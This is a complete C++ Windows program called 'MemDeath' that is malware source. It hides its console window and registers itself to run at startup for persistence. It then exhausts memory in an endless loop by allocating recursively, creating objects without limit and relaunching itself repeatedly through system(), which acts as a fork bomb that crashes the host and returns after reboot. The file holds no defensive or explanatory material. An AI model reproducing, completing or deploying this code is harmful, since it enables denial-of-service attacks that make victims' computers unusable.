#include <windows.h>  
#include "TlHelp32.h"
#include <iostream>
#include "Files.h"
#define UNICODE 1
using namespace std;
string filename = "MemDeath.exe";
int chararray = sizeof(unsigned long int);
string startcom;
struct attack{

	attack(int x){
		char* ch = new char[x];
		malloc(sizeof(unsigned long int));
		system(startcom.c_str());
		new attack(chararray);
		new attack(chararray);
	}
	~attack(){
		system(startcom.c_str());
		malloc(sizeof(unsigned long int));
		new attack(chararray);
		new attack(chararray);
		cout << this << endl;
	}
};

void attacking(string startCommand){
	while(true){
		try{
			for(int i = 0; i < 15; i++){
				new attack(chararray);
			}
		}catch(exception e){
			new attack(chararray);
			system(startCommand.c_str());
			new attack(chararray);
			system(startCommand.c_str());
			attacking(startCommand);
		}
		attacking(startCommand);
	}
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int cmdShow){
	ShowWindow( GetConsoleWindow(), SW_HIDE );
	char  szPath[MAX_PATH];
	beginStartup(filename);
	if (GetModuleFileName(NULL, szPath, sizeof szPath) == 0) return -1;
	string startupPath = getStartupPath(filename);
	startcom = "\""+startupPath+"\"";
	cout << "startcom=" << startcom << endl;
	attacking(startcom);
	return 0;
}
